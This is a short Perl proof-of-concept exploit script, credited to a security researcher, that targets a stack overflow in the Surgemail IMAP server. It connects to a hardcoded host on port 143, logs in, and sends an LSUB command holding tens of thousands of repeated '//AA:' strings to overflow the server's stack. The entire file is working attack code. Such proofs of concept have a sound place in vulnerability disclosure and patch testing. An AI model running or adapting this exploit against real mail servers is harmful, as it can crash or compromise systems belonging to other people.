#
#
#       Surgemail stack overflow PoC exploit - latest version
#	Coded by Leon Juranic <leon.juranic@infigo.hr>
#	http://www.infigo.hr/en/
#

use IO::Socket;


$host = "192.168.0.15";
$user = "test";
$pass = "test";
$str = "//AA:";

$sock = IO::Socket::INET->new(PeerAddr => $host,
        PeerPort => "143",
        Proto    => "tcp") || die ("Cannot connect!!!\n");



        print $a = <$sock>;
        print $sock "a001 LOGIN $user $pass\r\n";
        print $a = <$sock>;
        print $sock "a002 LSUB " . $str x 12000 . " " . $str x 21000 . "\r\n";
        print $a = <$sock>;